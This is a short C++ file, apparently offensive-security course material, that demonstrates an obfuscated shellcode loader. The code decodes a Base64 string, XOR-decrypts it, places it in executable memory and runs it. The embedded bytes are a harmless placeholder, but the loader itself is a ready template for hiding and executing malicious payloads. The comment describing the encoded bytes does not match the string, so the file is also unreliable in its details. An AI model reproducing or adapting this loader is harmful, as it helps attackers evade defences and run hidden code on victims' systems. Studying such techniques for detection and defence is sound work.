// Filename: advanced_mixed_obfuscation.cpp
// Purpose: Combine Base64, XOR, and runtime decryption for shellcode execution.
// Instructor: Joas A Santos - https://www.linkedin.com/in/joas-antonio-dos-santos - https://github.com/CyberSecurityUP

#include <windows.h>
#include <vector>
#include <iostream>
#include <string>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

std::string base64Decode(const std::string& input) {
    DWORD outLen = 0;
    CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, NULL, &outLen, NULL, NULL);
    std::vector<BYTE> output(outLen);
    CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, output.data(), &outLen, NULL, NULL);
    return std::string((char*)output.data(), output.size());
}

int main() {
    std::string b64 = "kJCQjw=="; // base64 of XOR'd shellcode \x90\x90\xC3 ^ 0xAB
    std::string decoded = base64Decode(b64);

    for (auto& c : decoded) c ^= 0xAB;

    void* mem = VirtualAlloc(0, decoded.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(mem, decoded.data(), decoded.size());
    ((void(*)())mem)();

    return 0;
}
